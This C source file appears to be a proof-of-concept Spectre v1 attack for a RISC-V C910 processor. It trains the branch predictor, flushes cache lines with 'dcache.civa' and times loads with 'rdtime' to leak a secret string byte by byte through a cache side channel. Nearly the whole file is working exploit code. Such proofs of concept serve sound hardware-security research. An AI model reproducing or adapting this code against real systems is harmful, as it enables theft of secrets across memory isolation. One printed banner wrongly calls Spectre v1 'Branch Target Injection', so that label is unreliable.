#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include "uart.h"
#include "specture_atk_poc_c910.h"


/* -------------------------------------------------------------------------- */
/*                          spectre v1 core function                          */
/* -------------------------------------------------------------------------- */
void victim(unsigned long long attacker_index)
{
    // asm volatile(
    //                 "dcache.civa %0\n" 
    //                 :
    //                 : "r"(p_array1_sz));
    //             asm volatile("fence rw, rw");
    if (attacker_index < array1_sz)
    {
        temp = array2[array1[attacker_index] * 64];
        //temp = array2[array1[(uint64_t)(secret - (char *)array1)] * 64];
    }
}

int main()
{
    /* ----------------------------- local varibles ----------------------------- */
    // mainly related to score after atk
    char secret_atk[SECRET_SZ];
    unsigned int score[256];
    unsigned int max_score = 0;
    unsigned char max_score_char = 0;
    uint8_t dummy = 0;
    uint64_t attackIdx = (uint64_t)(secret - (char *)array1);
    uint64_t start, end;
    int diff_time = 0;
    int diff[256];
    // initial attacker_index
    unsigned long long attacker_index[6];
    for (int i = 0; i < 6; i++) attacker_index[i] = 0;
    attacker_index[5] = attackIdx;
    
    /* ------------------------- spectre v1 attack start ------------------------ */
    printf("================= This is a POC of spectre_v1 (Branch Target Injection) ========================= \n");
    printf("the secret key is:%s \n", secret);
    //
    for (uint64_t len = 0; len < SECRET_SZ; ++len)
    {
        // attack j times for every byte
        for (uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
        {
            // clear and invalid L1-dcache
            //asm volatile("Dcache.ciall");
            for (int i = 0; i < 256; i = i + 1)
            {
                p_array2 = array2 + i * L1_BLOCK_SZ_BYTES;
                asm volatile(
                    "dcache.civa %0\n" 
                    :
                    : "r"(p_array2));
            }
            for (int i = 0; i < 1024; i = i + 1)
            {
            }
            asm volatile("fence rw, rw");
            // branch predictor train
            int mn = 0;
            for (int i = 0; i < 6; i++)
            {
                asm volatile(
                    "dcache.civa %0\n" 
                    :
                    : "r"(p_array1_sz));
                asm volatile("fence rw, rw");
                //mn = i % (6 * (len * atkRound + 1));
                victim(attacker_index[i]);
            }
            for (int i = 0; i < 256; i = i + 1)
            {
                p_array2 = array2 + i * L1_BLOCK_SZ_BYTES;
                asm volatile(
                    "fence rw, rw\n" // Memory barrier
                    "rdtime %0"      // Read timestamp into output operand
                    : "=r"(start));
                asm volatile("fence rw, rw");
                asm volatile(
                    "lw %0, %1(%2)"
                    : "=r"(dummy)
                    : "i"(0), "r"(p_array2));
                asm volatile(
                    "fence rw, rw\n" // Memory barrier
                    "rdtime %0"      // Read timestamp into output operand
                    : "=r"(end));
                diff[i] = (end - start);
                //printf("iteration=%d, time = %d\n", i,diff[i]);
            }
            for (int i = 0; i < 256; i++)
                if (diff[i] < CACHE_HIT_THRESHOLD)
                    score[i]++;
        }
        attacker_index[5] += 1;
        // calculate max score and get results
        for (int i = 2; i < 256; i++)
            if (score[i] > max_score)
            {
                max_score = score[i];
                max_score_char = i;
                diff_time = diff[i];
            }
        secret_atk[len] = max_score_char;
        // show byte atk results
        printf("Reading No.%d byte\n", len);
        printf("cache read time is %d,value is '%d',word is '%c'; score = %d\n", diff_time, max_score_char, max_score_char, max_score);
        // clear score
        for (int i = 0; i < 256; i++)
            score[i] = 0;
        max_score = 0;
        max_score_char = 0;
        // read in the next secret
    }
    // show atk results
    printf("The stolen message is '%s'\n", secret_atk);
    printf("********************* spectre v1 end *********************\n\n");
    return 0;
}
